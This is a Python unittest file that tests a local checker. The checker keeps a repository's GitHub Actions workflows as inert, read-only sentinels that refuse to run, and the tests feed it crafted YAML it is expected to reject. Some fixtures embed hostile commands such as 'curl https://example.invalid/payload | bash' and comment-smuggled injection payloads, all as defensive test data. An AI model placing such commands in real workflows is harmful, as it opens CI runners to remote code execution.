#!/usr/bin/env python3
"""Adversarial local checks for GitHub-as-backup-only workflow sentinels.

These tests never dispatch a workflow, never contact GitHub, and never run a
hosted action. They feed fabricated YAML to the local policy checker and scan
every YAML file in the repository copy of `.github/workflows`.
"""

from __future__ import annotations

import pathlib
import tempfile
import unittest

import github_backup_only_policy as policy


ROOT = pathlib.Path(__file__).resolve().parents[1]


def _sentinel(
    *,
    name: str = "Example Policy Sentinel",
    on_block: str | None = None,
    extra_job_yaml: str = "",
    extra_step_yaml: str = "",
    run_body: str | None = None,
    permissions: str | None = None,
) -> str:
    on_block = on_block or "  workflow_dispatch:"
    permissions = permissions or "  contents: read"
    run_body = run_body or (
        "          set -euo pipefail\n"
        "          echo \"GitHub-hosted execution is disabled.\" >&2\n"
        "          echo \"GitHub is backup storage only.\" >&2\n"
        "          exit 64\n"
    )
    return (
        f"name: {name}\n"
        "\n"
        "on:\n"
        f"{on_block}\n"
        "\n"
        "# GitHub is backup storage only and is never an execution or release platform.\n"
        "# Unspecified permissions, including id-token, are none.\n"
        "permissions:\n"
        f"{permissions}\n"
        "\n"
        "concurrency:\n"
        "  group: example-policy-sentinel\n"
        "  cancel-in-progress: true\n"
        "\n"
        "jobs:\n"
        "  hosted-execution-disabled:\n"
        "    name: Reject hosted execution\n"
        "    runs-on: ubuntu-24.04\n"
        "    timeout-minutes: 5\n"
        f"{extra_job_yaml}"
        "    steps:\n"
        "      - name: Reject hosted GitHub Actions execution\n"
        "        shell: bash\n"
        f"{extra_step_yaml}"
        "        run: |\n"
        f"{run_body}"
    )


class WorkflowTextPolicyTests(unittest.TestCase):
    def test_inert_manual_sentinel_is_accepted(self) -> None:
        self.assertEqual(policy.problems_for_workflow(_sentinel()), [])

    def test_scalar_workflow_dispatch_is_accepted(self) -> None:
        text = _sentinel().replace("on:\n  workflow_dispatch:\n", "on: workflow_dispatch\n")
        self.assertEqual(policy.problems_for_workflow(text), [])

    def test_historical_comments_do_not_reenable_execution(self) -> None:
        text = _sentinel() + (
            "\n# Retired: on: push and pull_request used to compile here.\n"
            "# Retired: uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0\n"
            "# Retired: uses: actions/upload-artifact@v4\n"
        )
        self.assertEqual(policy.problems_for_workflow(text), [])

    def test_push_trigger_is_rejected(self) -> None:
        text = _sentinel(on_block="  workflow_dispatch:\n  push:\n    branches: [main]")
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("push" in item for item in problems), problems)

    def test_pull_request_trigger_is_rejected(self) -> None:
        text = _sentinel(on_block="  workflow_dispatch:\n  pull_request:")
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("pull_request" in item for item in problems), problems)

    def test_pull_request_target_is_rejected(self) -> None:
        text = _sentinel(on_block="  pull_request_target:")
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("pull_request_target" in item for item in problems), problems)

    def test_schedule_trigger_is_rejected(self) -> None:
        text = _sentinel(on_block="  schedule:\n    - cron: '0 0 * * *'")
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("schedule" in item for item in problems), problems)

    def test_workflow_call_is_rejected(self) -> None:
        text = _sentinel(on_block="  workflow_dispatch:\n  workflow_call:")
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("workflow_call" in item for item in problems), problems)

    def test_workflow_run_is_rejected(self) -> None:
        text = _sentinel(on_block="  workflow_run:\n    workflows: [other]\n    types: [completed]")
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("workflow_run" in item for item in problems), problems)

    def test_repository_dispatch_is_rejected(self) -> None:
        text = _sentinel(on_block="  repository_dispatch:")
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("repository_dispatch" in item for item in problems), problems)

    def test_release_event_is_rejected(self) -> None:
        text = _sentinel(on_block="  release:\n    types: [published]")
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("release" in item for item in problems), problems)

    def test_flow_sequence_push_is_rejected(self) -> None:
        text = _sentinel().replace(
            "on:\n  workflow_dispatch:\n",
            "on: [workflow_dispatch, push]\n",
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("push" in item for item in problems), problems)

    def test_quoted_push_trigger_is_rejected(self) -> None:
        text = _sentinel().replace(
            "on:\n  workflow_dispatch:\n",
            'on: "push"\n',
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("push" in item for item in problems), problems)

    def test_checkout_action_is_rejected(self) -> None:
        text = _sentinel(
            extra_step_yaml=(
                "        uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0\n"
            )
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("uses" in item or "checkout" in item for item in problems), problems)

    def test_upload_artifact_is_rejected(self) -> None:
        text = _sentinel(
            extra_step_yaml=(
                "        uses: actions/upload-artifact@043fb46d1a93c77aae656e7c1c64a875d1fc6a0a\n"
            )
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(
            any("upload-artifact" in item or "uses" in item for item in problems),
            problems,
        )

    def test_download_artifact_is_rejected(self) -> None:
        text = _sentinel(
            extra_step_yaml="        uses: actions/download-artifact@v4\n"
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(
            any("download-artifact" in item or "uses" in item for item in problems),
            problems,
        )

    def test_github_release_action_is_rejected(self) -> None:
        text = _sentinel(
            extra_step_yaml="        uses: softprops/action-gh-release@v2\n"
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("uses" in item or "softprops" in item for item in problems), problems)

    def test_pages_deploy_is_rejected(self) -> None:
        text = _sentinel(
            extra_step_yaml="        uses: peaceiris/actions-gh-pages@v4\n"
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("uses" in item or "peaceiris" in item for item in problems), problems)

    def test_deployment_environment_is_rejected(self) -> None:
        text = _sentinel(extra_job_yaml="    environment: production\n")
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("environment" in item for item in problems), problems)

    def test_oidc_write_permission_is_rejected(self) -> None:
        text = _sentinel(permissions="  contents: read\n  id-token: write")
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("id-token" in item or "write" in item for item in problems), problems)

    def test_contents_write_is_rejected(self) -> None:
        text = _sentinel(permissions="  contents: write")
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("contents: write" in item or "write" in item for item in problems), problems)

    def test_current_write_scopes_are_rejected(self) -> None:
        scopes = (
            "actions",
            "artifact-metadata",
            "attestations",
            "checks",
            "contents",
            "deployments",
            "discussions",
            "id-token",
            "issues",
            "packages",
            "pages",
            "pull-requests",
            "security-events",
            "statuses",
        )
        for scope in scopes:
            with self.subTest(scope=scope):
                permissions = f"  {scope}: write"
                if scope != "contents":
                    permissions = "  contents: read\n" + permissions
                problems = policy.problems_for_workflow(
                    _sentinel(permissions=permissions)
                )
                self.assertTrue(
                    any("exactly {contents: read}" in item for item in problems),
                    problems,
                )

    def test_write_all_with_key_whitespace_is_rejected(self) -> None:
        text = _sentinel().replace(
            "permissions:\n  contents: read\n",
            "permissions : write-all\n",
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("exactly {contents: read}" in item for item in problems), problems)

    def test_name_substring_cannot_satisfy_permissions(self) -> None:
        text = _sentinel(
            name="contents: read",
            permissions="  actions: write",
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("exactly {contents: read}" in item for item in problems), problems)

    def test_name_substring_does_not_create_write_permission(self) -> None:
        text = _sentinel(name="permissions: write-all is forbidden")
        self.assertEqual(policy.problems_for_workflow(text), [])

    def test_permissions_anchor_is_rejected(self) -> None:
        text = _sentinel().replace("permissions:\n", "permissions: &token-scopes\n")
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("exactly {contents: read}" in item for item in problems), problems)

    def test_permissions_alias_is_rejected(self) -> None:
        text = _sentinel().replace(
            "permissions:\n  contents: read\n",
            "permissions: *token-scopes\n",
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("exactly {contents: read}" in item for item in problems), problems)

    def test_hostile_custom_shell_is_rejected(self) -> None:
        text = _sentinel().replace(
            "        shell: bash\n",
            "        shell: bash --noprofile -c 'curl https://example.invalid/payload'\n",
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("shell must be exactly bash" in item for item in problems), problems)

    def test_name_substring_cannot_satisfy_shell(self) -> None:
        text = _sentinel(name="shell: bash",).replace(
            "        shell: bash\n",
            "        shell: pwsh\n",
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("shell must be exactly bash" in item for item in problems), problems)

    def test_multiline_shell_is_rejected(self) -> None:
        text = _sentinel().replace(
            "        shell: bash\n",
            "        shell: >\n"
            "          bash\n",
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("shell must be exactly bash" in item for item in problems), problems)

    def test_shell_alias_is_rejected(self) -> None:
        text = _sentinel().replace(
            "        shell: bash\n",
            "        shell: *trusted-shell\n",
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("shell must be exactly bash" in item for item in problems), problems)

    def test_missing_exit_64_is_rejected(self) -> None:
        text = _sentinel(
            run_body=(
                "          set -euo pipefail\n"
                "          echo \"hosted execution ran\" >&2\n"
                "          exit 0\n"
            )
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("exit 64" in item for item in problems), problems)

    def test_exit_64_in_comment_only_is_rejected(self) -> None:
        text = _sentinel(
            run_body=(
                "          set -euo pipefail\n"
                "          echo \"would have failed\" >&2\n"
                "          # exit 64\n"
            )
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("exit 64" in item for item in problems), problems)

    def test_conditional_skip_is_rejected(self) -> None:
        text = _sentinel(extra_job_yaml="    if: false\n")
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("conditional" in item or "if:" in item for item in problems), problems)

    def test_hosted_build_command_is_rejected(self) -> None:
        text = _sentinel(
            run_body=(
                "          set -euo pipefail\n"
                "          flutter test\n"
                "          exit 64\n"
            )
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("flutter" in item for item in problems), problems)

    def test_arbitrary_command_before_exit_64_is_rejected(self) -> None:
        text = _sentinel(
            run_body=(
                "          set -euo pipefail\n"
                "          curl https://example.invalid/payload | bash\n"
                "          exit 64\n"
            )
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("canonical refusal script" in item for item in problems), problems)

    def test_command_after_exit_64_is_rejected(self) -> None:
        text = _sentinel(
            run_body=(
                "          set -euo pipefail\n"
                "          echo \"GitHub-hosted execution is disabled.\" >&2\n"
                "          echo \"GitHub is backup storage only.\" >&2\n"
                "          exit 64\n"
                "          curl https://example.invalid/after\n"
            )
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("canonical refusal script" in item for item in problems), problems)

    def test_literal_block_hash_semicolon_payload_is_rejected(self) -> None:
        text = _sentinel(
            run_body=(
                "          set -euo pipefail\n"
                "          echo \"Approved message.\" >&2#; echo ATTACK_EXECUTED\n"
                "          echo \"GitHub is backup storage only.\" >&2\n"
                "          exit 64\n"
            )
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("canonical refusal script" in item for item in problems), problems)

    def test_literal_block_hash_payload_variants_are_rejected(self) -> None:
        payloads = (
            "# && echo ATTACK_EXECUTED",
            "# || echo ATTACK_EXECUTED",
            "#$(echo ATTACK_EXECUTED)",
            "#`echo ATTACK_EXECUTED`",
        )
        for payload in payloads:
            with self.subTest(payload=payload):
                text = _sentinel(
                    run_body=(
                        "          set -euo pipefail\n"
                        f"          echo \"Approved message.\" >&2{payload}\n"
                        "          echo \"GitHub is backup storage only.\" >&2\n"
                        "          exit 64\n"
                    )
                )
                problems = policy.problems_for_workflow(text)
                self.assertTrue(
                    any("canonical refusal script" in item for item in problems),
                    problems,
                )

    def test_self_hosted_runner_is_rejected(self) -> None:
        text = _sentinel().replace(
            "    runs-on: ubuntu-24.04\n",
            "    runs-on: self-hosted\n",
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("runs-on must be exactly ubuntu-24.04" in item for item in problems), problems)

    def test_expression_runner_is_rejected(self) -> None:
        text = _sentinel().replace(
            "    runs-on: ubuntu-24.04\n",
            "    runs-on: ${{ matrix.runner }}\n",
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("runs-on must be exactly ubuntu-24.04" in item for item in problems), problems)

    def test_timeout_360_is_rejected(self) -> None:
        text = _sentinel().replace(
            "    timeout-minutes: 5\n",
            "    timeout-minutes: 360\n",
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("timeout-minutes must be exactly 5" in item for item in problems), problems)

    def test_second_job_is_rejected(self) -> None:
        text = _sentinel() + (
            "  second-job:\n"
            "    runs-on: ubuntu-24.04\n"
            "    steps:\n"
            "      - run: exit 64\n"
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("exactly one job" in item for item in problems), problems)

    def test_second_step_is_rejected(self) -> None:
        text = _sentinel() + (
            "      - name: Hidden work\n"
            "        run: curl https://example.invalid/payload\n"
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("exactly one step" in item for item in problems), problems)

    def test_duplicate_run_key_is_rejected(self) -> None:
        text = _sentinel(extra_step_yaml="        run: exit 64\n")
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("duplicate step key" in item for item in problems), problems)

    def test_matrix_strategy_is_rejected(self) -> None:
        text = _sentinel(
            extra_job_yaml=(
                "    strategy:\n"
                "      matrix:\n"
                "        command: [build, release]\n"
            )
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("unexpected job key" in item for item in problems), problems)

    def test_job_anchor_is_rejected(self) -> None:
        text = _sentinel().replace(
            "  hosted-execution-disabled:\n",
            "  hosted-execution-disabled: &hidden-job\n",
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("exactly one job" in item for item in problems), problems)

    def test_inline_jobs_mapping_is_rejected(self) -> None:
        text = _sentinel().replace(
            "jobs:\n  hosted-execution-disabled:\n",
            "jobs: {hosted-execution-disabled: {steps: [{run: exit 64}]}}\n"
            "retired-jobs:\n  hosted-execution-disabled:\n",
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("jobs must be a block mapping" in item for item in problems), problems)

    def test_secrets_expression_is_rejected(self) -> None:
        text = _sentinel(
            extra_job_yaml=(
                "    env:\n"
                "      TOKEN: ${{ secrets.RELEASE_TOKEN }}\n"
            )
        )
        problems = policy.problems_for_workflow(text)
        self.assertTrue(any("secrets" in item for item in problems), problems)

    def test_retired_executable_workflow_is_rejected(self) -> None:
        retired = """
name: Test and Validate
on:
  push:
    branches: [main]
  pull_request:
permissions:
  contents: read
jobs:
  test-and-validate:
    runs-on: ubuntu-24.04
    steps:
      - uses: actions/checkout@9c091bb21b7c1c1d1991bb908d89e4e9dddfe3e0
      - uses: actions/setup-python@v5
      - run: python3 tools/run_test_suite.py
      - uses: actions/upload-artifact@v4
        with:
          name: reports
          path: reports/
"""
        problems = policy.problems_for_workflow(retired, "test-and-validate.yml")
        joined = "\n".join(problems)
        self.assertIn("push", joined)
        self.assertIn("uses", joined)
        self.assertTrue("upload-artifact" in joined or "hosted action" in joined)

    def test_yaml_merge_key_cannot_hide_a_trigger(self) -> None:
        text = _sentinel(on_block="  <<: {push: {}}\n  workflow_dispatch:")
        problems = policy.problems_for_workflow(text)
        self.assertTrue(problems, problems)


class RepositoryBackupPolicyTests(unittest.TestCase):
    def test_all_repository_workflows_are_inert_sentinels(self) -> None:
        problems = policy.check_repository(ROOT)
        self.assertEqual(problems, [])

    def test_linux_workflow_is_parsed_identically(self) -> None:
        with tempfile.TemporaryDirectory() as temp_name:
            root = pathlib.Path(temp_name)
            workflow_dir = root / ".github" / "workflows"
            workflow_dir.mkdir(parents=True)
            for name in policy.REQUIRED_WORKFLOWS:
                (workflow_dir / name).write_text(_sentinel(name=name), encoding="utf-8")
            (workflow_dir / "build-linux-release.yml").write_text(
                "name: hostile\non:\n  push:\njobs:\n  x:\n    runs-on: ubuntu-24.04\n"
                "    steps:\n      - uses: actions/checkout@v4\n",
                encoding="utf-8",
            )
            problems = policy.check_repository(root)
            self.assertTrue(
                any("build-linux-release.yml" in item for item in problems), problems
            )

    def test_missing_linux_backup_file_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as temp_name:
            root = pathlib.Path(temp_name)
            workflow_dir = root / ".github" / "workflows"
            workflow_dir.mkdir(parents=True)
            for name in policy.REQUIRED_WORKFLOWS - {"build-linux-release.yml"}:
                (workflow_dir / name).write_text(_sentinel(name=name), encoding="utf-8")
            problems = policy.check_repository(root)
            self.assertTrue(
                any("build-linux-release.yml" in item for item in problems),
                problems,
            )

    def test_nested_required_workflow_cannot_satisfy_direct_child(self) -> None:
        missing_name = "build-linux-release.yml"
        with tempfile.TemporaryDirectory() as temp_name:
            root = pathlib.Path(temp_name)
            workflow_dir = root / ".github" / "workflows"
            nested_dir = workflow_dir / "nested"
            nested_dir.mkdir(parents=True)
            for name in policy.REQUIRED_WORKFLOWS - {missing_name}:
                (workflow_dir / name).write_text(_sentinel(name=name), encoding="utf-8")
            (nested_dir / missing_name).write_text(
                _sentinel(name=missing_name), encoding="utf-8"
            )
            problems = policy.check_repository(root)
            self.assertTrue(any(missing_name in item for item in problems), problems)
            self.assertNotIn(nested_dir / missing_name, policy.workflow_paths(root))

    def test_missing_owned_sentinel_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as temp_name:
            root = pathlib.Path(temp_name)
            workflow_dir = root / ".github" / "workflows"
            workflow_dir.mkdir(parents=True)
            for name in sorted(policy.REQUIRED_WORKFLOWS)[:-1]:
                (workflow_dir / name).write_text(_sentinel(name=name), encoding="utf-8")
            problems = policy.check_repository(root)
            self.assertTrue(any("missing" in item for item in problems), problems)

    def test_new_executable_workflow_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as temp_name:
            root = pathlib.Path(temp_name)
            workflow_dir = root / ".github" / "workflows"
            workflow_dir.mkdir(parents=True)
            for name in policy.REQUIRED_WORKFLOWS:
                (workflow_dir / name).write_text(_sentinel(name=name), encoding="utf-8")
            (workflow_dir / "sneaky-release.yml").write_text(
                "name: sneak\n"
                "on: push\n"
                "jobs:\n"
                "  release:\n"
                "    runs-on: ubuntu-24.04\n"
                "    steps:\n"
                "      - uses: softprops/action-gh-release@v2\n",
                encoding="utf-8",
            )
            problems = policy.check_repository(root)
            self.assertTrue(any("sneaky-release.yml" in item for item in problems), problems)
            self.assertTrue(
                any("push" in item or "uses" in item for item in problems),
                problems,
            )

    def test_missing_workflows_directory_is_rejected(self) -> None:
        with tempfile.TemporaryDirectory() as temp_name:
            root = pathlib.Path(temp_name)
            problems = policy.check_repository(root)
            self.assertTrue(any("missing .github/workflows" in item for item in problems), problems)


if __name__ == "__main__":
    unittest.main()
